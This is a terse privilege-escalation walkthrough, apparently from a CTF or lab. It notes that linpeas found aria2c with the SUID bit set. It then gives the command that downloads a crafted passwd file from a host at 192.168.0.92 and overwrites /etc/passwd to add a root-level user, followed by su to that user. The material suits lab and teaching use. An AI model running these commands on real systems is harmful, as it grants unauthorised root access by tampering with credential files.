linpeas\.sh

/usr/bin/aria2c SUID bit set -  refer hacktricks on privesc
refer to aria2c documentation

add a user with root permissions in /etc/passwd file and download it onto victim machine

/usr/bin/aria2c \-d /etc \-o passwd [http://192.168.0.92:8000/passwd](#http://192.168.0.92:8000/passwd)
\-\-allow\-overwrite=true

su hacker
passwd

# root